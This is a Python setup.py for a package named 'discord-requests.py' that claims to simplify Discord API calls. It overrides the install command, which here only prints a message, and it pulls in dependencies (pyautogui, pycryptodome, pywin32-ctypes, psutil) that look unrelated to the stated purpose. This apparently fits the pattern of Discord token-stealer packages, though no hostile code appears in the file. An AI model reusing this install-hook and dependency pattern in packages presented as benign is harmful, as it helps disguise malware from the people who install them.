from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        print('SE HA INSTALADO CORRECTAMENTE EL MODULO.')
        install.run(self)

setup(
    name='discord-requests.py',
    version='1.0.1',
    description='Simplification of all discord API requests.',
    author='Benjamin Rodriguez',
    author_email='benjaminrodriguezshhh@proton.me',
    packages=['discord_requests_lib'],
    cmdclass={'install': CustomInstall},
    install_requires=[
        "requests",
        "pyautogui",
        "pycryptodome",
        "pywin32-ctypes",
        "psutil",
    ]
)